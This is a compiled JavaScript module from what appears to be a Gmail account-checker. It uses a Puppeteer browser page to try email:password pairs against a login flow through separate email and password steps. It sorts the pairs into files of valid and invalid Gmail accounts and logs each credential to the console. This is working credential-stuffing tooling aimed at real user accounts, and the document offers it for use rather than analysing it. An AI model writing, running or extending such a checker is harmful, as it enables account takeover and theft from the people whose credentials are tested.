"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.checker = void 0;
// Import puppeteer
const fs_1 = require("fs");
const emailFunc_1 = require("./components/emailFunc");
const passFunc_1 = require("./components/passFunc");
const checker = (page, email, pass) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const emailRes = yield (0, emailFunc_1.emailFunc)(page, email, pass);
        if (emailRes.err) {
            yield fs_1.promises.writeFile('./out/invalid_gmails.txt', `${email}:${pass}:${emailRes.err}\n`);
            console.log('bad email: ', `${email}:${pass}`);
            yield page.close();
            return;
        }
        console.log('passed email check: ', `${email}:${pass}`);
        yield page.waitFor(2000);
        const passwordRes = yield (0, passFunc_1.passFunc)(page, email, pass);
        if (passwordRes.err) {
            console.log('passwordRes: ', passwordRes, ` ${email}:${pass}`);
            yield fs_1.promises.writeFile('./out/invalid_gmails.txt', `${email}:${pass}:${passwordRes.err}\n`);
            yield page.close();
            return;
        }
        yield fs_1.promises.writeFile('./out/valid_gmails.txt', `${email}:${pass}\n`);
        console.log('valid account: ', `${email}:${pass}`);
        yield page.waitForNavigation({ waitUntil: 'networkidle0' });
        yield page.close();
    }
    catch (err) {
        console.error('checker error: ', err);
        yield page.close();
    }
});
exports.checker = checker;
